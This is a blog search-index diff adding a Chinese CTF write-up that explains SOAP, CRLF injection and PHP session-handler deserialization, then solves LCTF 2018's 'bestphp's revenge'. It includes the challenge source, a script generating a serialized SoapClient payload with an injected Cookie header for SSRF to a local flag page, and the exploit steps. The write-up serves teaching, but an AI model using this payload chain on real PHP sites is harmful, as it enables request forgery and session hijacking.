@@ -1,6 +1,118 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SoapClient反序列化</title>
+    <url>/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p>  因为期末还有懒的缘故，一个多月没更博了。这个暑假得整整srtp、学学web啥的，但是拖延症晚期的我也不知道能做到什么程度，一步步来吧。（<del>上</del>掉分还是香）</p>
+<p>前几天带恶人师傅给我们讲了一下反序列化的一些操作，今天打算把<code>SoapClient</code>再看看（虽然好像说是已经考的很多了），之后再把<code>pchar</code>反序列化总结一下。之后会把web系统的学习一遍吧，最后再根据模块整理整理发出来。下面进入正题：</p>
+<blockquote>
+<p>Webservice工作原理：<a href="https://blog.csdn.net/yangwenxue_admin/article/details/51059125" target="_blank" rel="noopener">https://blog.csdn.net/yangwenxue_admin/article/details/51059125</a></p>
+<p>SOAP的基本概念：<a href="https://www.anquanke.com/post/id/153065#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065#h2-1</a></p>
+<p>PHP手册中的SoapClient类：<a href="https://www.php.net/manual/zh/soapclient.soapclient.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/soapclient.soapclient.php</a></p>
+<p>PHP的session反序列化漏洞：<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<p>PHP原生类（反序列化）：<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p>
+</blockquote>
+<h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><p>1.WebService三要素：</p>
+<p>​    WSDL(WebServices Description Language)用来描述如何访问具体的接口； </p>
+<p>​    UDDI(Universal Description Discovery and Integration)用来管理、分发、查询WebService ；</p>
+<p>​    SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口，采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
+<p>2.实现一个完整的Web服务工作流程：<br>    Web服务提供者设计实现Web服务，并将调试正确后的Web服务通过Web服务中介者发布，并在UDDI注册中心注册；（发布）</p>
+<p>​    Web服务请求者向Web服务中介者请求特定的服务，中介者根据请求查询UDDI注册中心，为请求者寻找满足请求的服务；（发现）</p>
+<p>​    Web服务中介者向Web服务请求者返回满足条件的Web服务描述信息，该描述信息用WSDL写成，各种支持Web服务的机器都能阅读；（发现）</p>
+<p>​    利用从Web服务中介者返回的描述信息生成相应的SOAP消息，发送给Web服务提供者，以实现Web服务的调用；(绑定）</p>
+<p>​    Web服务提供者按SOAP消息执行相应的Web服务，并将服务结果返回给Web服务请求者。（绑定）</p>
+<p>3.PHP 的 SOAP 扩展可以用来提供和使用 Web Services，<a href="https://www.cnblogs.com/kvienchen/p/8310798.html" target="_blank" rel="noopener">SOAP扩展中实现了6个类</a>。</p>
+<p>​    其中有三个高级的类： SoapClient、SoapServer 和SoapFault，三个低级类：SoapHeader、SoapParam 和 SoapVar。</p>
+<p>他们的关系如下：</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>​    下面我们着重看其中的SoapClient类，它用于创建soap数据报文，并与wsdl接口进行交互，同时这个类下也是有反序列化中常常用到的<code>SoapClient::__soapCall()</code>魔术方法。</p>
+<p>其构造函数如下：</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure></div>
+
+<p>​    第一个参数用来指明是否是wsdl模式。</p>
+<p>​    第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>​    我们向下查看文档时发现<code>$options</code>中有一个选项为<code>user_agent</code></p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>​    我们可以利用<code>user_agent</code>来自定义<code>User-Agent</code>，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>为和<code>Content-Length</code>都在<code>User-Agent</code>之下，我们可以进行覆盖。</p>
+<p>4.CRLF Injection</p>
+<p>  CRLF是”回车 + 换行”<code>(\r\n)</code>的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
+<p>5.PHP的session反序列化漏洞</p>
+<p>​    php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
+<p>​    存储的文件是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列话之后的内容。</p>
+<p>​    PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p>
+<table>
+<thead>
+<tr>
+<th align="left">处理器</th>
+<th align="left">对应的存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">php</td>
+<td align="left">键名key + 竖线 + 经过serialize()函数反序列化处理的值value</td>
+</tr>
+<tr>
+<td align="left">php_serialize(php&gt;=5.5.4)</td>
+<td align="left">经过serialize()函数反序列处理的数组</td>
+</tr>
+<tr>
+<td align="left">php_binary</td>
+<td align="left">键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数反序列化处理的值</td>
+</tr>
+</tbody></table>
+<p>​    在PHP中默认使用的是php引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p>
+<p>  如果PHP在反序列化存储的$_SEESION数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的伪造，甚至可以伪造任意数据。</p>
+<p>  当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，对value多进行一次反序列化，达到我们触发反序列化的目的。</p>
+<p>例如传入 <code>$_SESSION[&#39;name&#39;]=&#39;|O:4:&quot;btis&quot;:0:{}&#39;;</code></p>
+<p>若序列化引擎为php_serialize，那么存储的session文件为</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">"|O:4:"</span>btis<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>当其用php引擎反序列化时，其中键名为<code>a:1:{s:16:&quot;</code>，后面是一个btis对象的注入，所以我们控制<code>|</code>后面的对象使其触发反序列化从而进行SSRF。</p>
+<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>session反序列化漏洞、SoapClient（CRLF+SSRF）</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>  利用回调函数覆盖session序列化引擎为<code>php_serilaze</code>，构造SSRF的<code>SoapClient</code>类的序列化字符串配合CRLF写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数<code>call_user_func</code>，从而调用<code>SoapClient</code>类的未知方法，触发<code>__call</code>方法进行SSRF访问flag.php。把flag写入session，最后把session打印出来。</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>贴上题目源码</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure></div>
+
+<p>首先我们可以想到利用传入<code>$_GET[&#39;f&#39;]</code>为<code>extract</code>来进行变量覆盖，将<code>b</code>覆盖为我们想要的函数，比如<code>var_duamp</code>或者<code>print_r</code>，此时我们可以看到$_SESSION中是没有东西的。</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>​    于是我们想通过<code>ini_set()</code>函数来构造<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</code>来改变序列化时的处理器，从而使其和反序列化时处理引擎不同，但是$_POST中需要设置参数传输； 所以用<code>session_start([&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;])</code>，即POST传入<code>serialize_handler=php_serialize</code>来改变处理器，因为<code>session_start()</code>中如果提供参数，那么会用其中的项目覆盖 <a href="https://www.php.net/manual/zh/session.configuration.php" target="_blank" rel="noopener">会话配置指示</a> 中的配置项。</p>
+<p>下面说一下SoapClient类的构造：</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"btis\r\nCookie: PHPSESSID=ctrmmddufre6nph5908ajosbo7\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中有两个必备参数<code>location</code>是要将请求发送到的SOAP服务器的URL，<code>uri</code> 是SOAP服务的目标命名空间。我们将<code>location</code>设置为<code>http://127.0.0.1/flag.php</code>即本地flag.php文件，这个条件满足了flag.php中要求的<code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>，<code>uri</code>随便填就好。其中<code>user_agent</code>，是我们用来定义<code>User-Agent</code>，利用CRLF同时传入页面的<code>cookie</code>，使<code>$_SESSION[&#39;flag&#39;] = $flag;</code>保存到指定cookie中。</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22123</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>_stream_context%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A52%<span class="number">3</span>A%<span class="number">22</span>btis%<span class="number">0</span>D%<span class="number">0</span>ACookie%<span class="number">3</span>A+PHPSESSID%<span class="number">3</span>Dctrmmddufre6nph5908ajosbo7%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>
+
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>利用<code>php_serialize</code>序列化传入后，并用php反序列化处理后此时session中包含了：一个键名<code>a:1:{s:4:&quot;name&quot;;s:222:&quot;</code>，和一个SoapClient对象</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>name<span class="string">";s:222:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(SoapClient)#1 (5) &#123;</span></span><br><span class="line"><span class="string">    ["</span>uri<span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">    string(3) "</span><span class="number">123</span><span class="string">"</span></span><br><span class="line"><span class="string">    ["</span>location<span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">    string(25) "</span>http:<span class="comment">//127.0.0.1/flag.php"</span></span><br><span class="line">    [<span class="string">"_stream_context"</span>]=&gt;</span><br><span class="line">    int(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">"_user_agent"</span>]=&gt;</span><br><span class="line">    string(<span class="number">52</span>) <span class="string">"btis</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=ctrmmddufre6nph5908ajosbo7</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line">    [<span class="string">"_soap_version"</span>]=&gt;</span><br><span class="line">    int(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>下面我们用<code>extract()</code>将b覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION[&#39;name&#39;]</code>，所以我们传入<code>name=SoapClient</code></p>
+<p>最后的<code>call_user_func($b, $a)</code>就变成了<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code></p>
+<p>因为<code>SoapClient</code>对象中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求。</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>因为满足了flag.php中的要求所以flag被写入到$_SESSION中，所以我们携带刚才指定的cookie访问页面即可得到flag。</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/07/13/SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" src="/img/loading.gif" class="lazyload"></a>
+
+<p>​    这篇写了好久，中间开了好多次靶机，导致部分截图都不一样了。（虽然搞到很晚，但是终于搞完了！）</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>做题小记(2020.6.2)</title>
     <url>/2020/06/02/06-02-%E5%81%9A%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
     <content><![CDATA[<p>上周的pwnhub和rctf都有点难，看喽看，么得做，周末过的那叫一个颓废。（快期末了还在快乐LOL、把哈利波特系列刷了一遍、作息那叫一个混乱2333）</p>
